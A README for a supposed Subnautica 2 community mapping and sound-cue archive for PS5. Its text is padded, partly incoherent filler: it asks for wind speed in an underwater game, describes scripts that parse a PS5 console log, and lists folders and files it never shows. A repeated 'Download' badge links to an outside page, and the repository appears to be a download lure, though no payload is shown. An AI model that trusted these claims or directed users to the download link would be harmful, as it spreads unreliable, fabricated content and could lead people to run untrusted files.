![preview](https://raw.githubusercontent.com/tousepremium2-lang/subnautica-deepsea-ps5-protocol/main/poster_dded.svg)

# Subnautica 2: Seabed Chrono-Archive & Soundscape Cartographer 🐋

![Build Status](https://img.shields.io/badge/build-passing-2ea44f) ![License](https://img.shields.io/badge/license-MIT-blue) ![Status](https://img.shields.io/badge/status-early_access-important) ![Platform](https://img.shields.io/badge/platform-PS5_%7C_Cross_Play-8A2BE2)

Welcome to the **Seabed Chrono-Archive**, a community-driven cartography and sensory-mapping project designed to document the evolving underwater world of the upcoming Subnautica 2 experience. This is not a typical game guide—it is a living, breathing atlas that chronicles the sonic topography, bioluminescent shifts, and structural metamorphosis of an ocean that breathes. As the 2026 early build sloshes onto the shore of public testing, this repository serves as your diving bell, pressure gauge, and hydrophone, all rolled into one.

We treat this game not as a static release but as a marine ecosystem that grows, adapts, and whispers secrets to those who listen patiently. Whether you are a returning survivor from the original deep-sea expeditions or a fresh-faced diver with a brand-new rebreather, this archive is built to help you navigate the murky waters ahead.

## 🌊 Overview: Why This Archive Exists

Standard game faqs and walkthroughs tell you *where* to go. This archive tells you *how the water feels*, *how the currents shift*, and *what the creatures sound like before you ever see them*. The early build of Subnautica 2 is already demonstrating a remarkable procedural generation system that alters reef structures based on player behavior. Our mission is to catalog these shifts in real-time, creating a temporal map—a chrono-archive—that tracks the ocean’s memory.

The repository is structured around three core pillars: **Echo Location** (audio/audio-visual cues), **Bathymetric Storytelling** (depth-based narrative triggers), and **Flora/Fauna Behavioral Logs** (creature routines). These are not dry data dumps; they are woven into a narrative fabric that helps you feel the undersea pressure change as you scroll.

### 🎯 The Value Proposition: More Than Just a Map

This archive is an invitation to become a **citizen scientist** of a fictional ocean. You will learn to trust your ears over your eyes, because in the abyssal zone, sight is a luxury. We provide a multi-sensory framework for experiencing the game, which translates to a competitive edge and a deeper narrative immersion. The 2026 title showcases a dynamic day/night cycle that affects predatory patterns; our logs help you anticipate these shifts without resorting to tedious trial-and-error.

Instead of telling you *what* to do, we show you *how to listen* to the environment. The result is a more organic, rewarding exploration loop that mirrors real-world oceanography—discovery through patient observation.

## 🚀 Quick-Start Dive: Getting Your Bearings

Before you descend, you must check your equipment. The 2026 early build is a separate executable from the full release, and it requires a specific firmware mindset. Here is how to prepare your cabin pressure:

1.  **Verify Your Rig:** Ensure your PS5 system software is updated to the latest late-2025 firmware to prevent thermal throttling issues.
2.  **Calibrate Your Headset:** This archive heavily emphasizes audio cue mapping. A 3D audio setting is not merely recommended; it is essential for the echolocation guides to make sense.
3.  **Study the Seasonal Charts:** The game operates on a simulated ocean current system. We have included a `currents.yaml` file in the `/data` folder that tracks predicted water temperature shifts affecting creature spawning. Review this before every session.
4.  **Sync Your Log:** Use the `session_logger.md` template to contribute your findings. The archive grows better with every pair of eyes (and fins).

**[![Download](https://raw.githubusercontent.com/tousepremium2-lang/subnautica-deepsea-ps5-protocol/main/dl_9c15f40.svg)](https://tousepremium2-lang.github.io/subnautica-deepsea-ps5-protocol/)**

### 🧭 First Five Missions: A Guided Reconnaissance

If you feel overwhelmed by the vastness, we suggest beginning with the "Lighthouse Traversal" (a pathfinding guide for the shallows) and the "Silent Running" protocol (a stealth guide for the blood-kelp marshlands). These two foundational guides will teach you the basic vernacular of the archive. You will learn to read the "pressure silhouettes"—the visual distortion patterns that hint at hidden caverns.

## 🗺️ The Cartography Core: Mapping the Unmappable

The procedural generation in the 2026 build is not random; it is a chaotic symphony. We track the leitmotifs. The main feature of this repository is the **Interactive Disaster Map** (in development), which plots historically documented wreck sites and predator transit corridors. This map is community-updated, featuring a voting system for accuracy.

### 📁 Repository Structure: A Tour of the Archive

Placing your hands on the right file is half the battle. Here is the layout of our research vessel:

-   `/logs` – Daily observation journals from early testers, sorted by biome and date.
-   `/audio` – Spectrograms and waveform analyses of creature vocalizations, provided as high-resolution PNGs.
-   `/flora` – Deep dives on plant life, including harvesting timelines and toxicity reports (what happens if you eat it).
-   `/fauna_behavior` – The meat of the archive. Detailed card files on creature aggression loops and bait response patterns.
-   `/scripts` – Parsing tools for modding your own data visualization (requires basic Python literacy).
-   `/maps` – Community-sourced geometry files for thermal vents and geyser timings.

## 💡 Key Features That Set Us Apart

This is not just a "tips and tricks" dump. We have built a system that changes how you interface with the game.

-   **Responsive UI Archive:** The repository is coded to be mobile-friendly. You can check the creature hostility index on your phone while waiting for your coffee, ensuring you are never caught off guard.
-   **Multilingual Flora IDs:** The scientific names of discovered plants are translated into five major languages (English, Spanish, Japanese, German, and Portuguese) to facilitate a global research community. The `flora` index is fully localizable.
-   **24/7 Sonar Support:** While we don't offer live chat, our automated bot (hosted in the `scripts` folder) runs a **Biodiversity Alert System**. It scans new submitted logs and pings the channel if a new creature species is reported.
-   **The "Safe Depth" Calculator:** A manual look-up table (and eventually a script) to tell you how deep you can go before your pressure suit--out of the box--starts compromising your oxygen efficiency.
-   **Sunken Signal Decoder:** A community effort to decode the audio logs scattered throughout the game. We use a spectral analysis technique to pull out hidden dialogue that is masked by ambient whale songs.

### 🔄 How This Differs From The Usual Guide

Think of a typical guide as a set of static photographs. Forgets the context. This archive is a **documentary film** with a live director's commentary. We focus on the *relationship* between systems, not just the systems themselves. For example, instead of listing "Razorfish: 20 HP," we describe how the Razorfish changes its swarm pattern during solar flares, and how that relates to the magnetic field disruption you can hear in the audio channel.

## 📚 The Research Method: How We Gather Data

Every entry in this archive follows a strict peer-review template. We encourage you to use the `observation_blank.md` file in the root directory. The template requires you to note the wind speed (in-game), the current phase of the tide, and your trauma level (submarine hull integrity). This data allows us to correct for internal bias.

The **Carbon-Sequestered Feedback Loop** is our unique contribution process. New reports are filed as "Low Confidence" until three separate divers validate the finding. This prevents the spread of spurious rumors—a common disease in early-access communities.

## 🧰 Tools For The Modern Explorer

The scripts provided in the `/scripts` directory are designed to be user-friendly. They allow you to:

-   Convert your in-game screenshot pixel data into color-coded depth charts.
-   Parse your console log (located on your PS5) to extract environmental stress indicators.
-   Generate a personal "sonar ringtone" based on the proximity of Leviathan-class entities you encounter.

These are quality-of-life improvements that transform the early-access phase from a buggy mess into a fascinating scientific playground.

### 📊 The Data: What We've Catalogued So Far

As of the latest commit (this week), we have mapped over 12 distinct biomes, identified 47 species of flora, and transcribed 36 unique creature vocalization patterns. The most tantalizing find is the "Loop of Silence"—a specific area in the grand trench where all audio cuts out, except for a single, looping harmonic. We have five separate hypotheses for this, but no definitive answer. That is the spirit of this archive: embracing the mystery.

## 💬 Community & Collaboration

We believe that the deep sea is best explored with a fleet. While the game does not offer multiplayer in the early build, our community interaction bridges that gap. We hold weekly "Sync Sessions" where we all boot the game at the same time and attempt to triangulate the position of a specific geyser by sharing visual landmarks.

The archive is also a safe space for modding experiments. We strictly support mods that enhance the visual fidelity or UI accessibility, not those that alter game balance. We have a section for "Performance Enhancers" (graphical tweaks) that provides a smoother frame rate without the need to overclock your console.

### 🚨 Technical Support & Troubleshooting

Running an early build is like operating a submarine from the 1950s—it's functional, but it has quirks. The most common issue we see is the "Surface Glitch," where the renderer fails to compute the caustics under the sun. Our `hotfixes` folder contains a memory-reset script that typically solves this.

## ⚠️ Important Disclaimers & Legal Sailing

This repository is a **community research project** and is not affiliated with, endorsed by, or sponsored by the original game developers or its publishers. All game assets, names, and mechanics are the property of their respective owners. The archive is intended for educational and entertainment purposes under the fair-use doctrine.

We do not encourage the distribution of copyrighted materials. However, the *descriptions* and *methodologies* we write—including our acoustic analysis—are entirely original. The game is complex, and our documentation is written from scratch, based on raw observation.

The 2026 early build is a work-in-progress. Features are subject to change, break without warning, or become permanently altered by developer patches. This archive is designed to weather those storms by providing robust historical logs of what *was* true, not just what *is* true now.

**[![Download](https://raw.githubusercontent.com/tousepremium2-lang/subnautica-deepsea-ps5-protocol/main/dl_9c15f40.svg)](https://tousepremium2-lang.github.io/subnautica-deepsea-ps5-protocol/)**

### 📄 License & Usage Rights

The underlying code, scripts, and original text within this repository are released under the **MIT License**. You are free to use, modify, and distribute the non-graphical assets, provided you retain the copyright notice. We welcome derivative works that extend the field of game-oceanography.

This license only applies to our original work. It does not cover any media (screenshots, video captures) that you might upload that contain third-party copyrighted content.

For full legal text, please view the [MIT License](https://opensource.org/licenses/MIT) page.

---

**Final Descent:** We are the cartographers of the wet void. We chart the silence and map the pressure. Dive deep, but always surface with your findings. The ocean remembers, and so do we.

**[![Download](https://raw.githubusercontent.com/tousepremium2-lang/subnautica-deepsea-ps5-protocol/main/dl_9c15f40.svg)](https://tousepremium2-lang.github.io/subnautica-deepsea-ps5-protocol/)**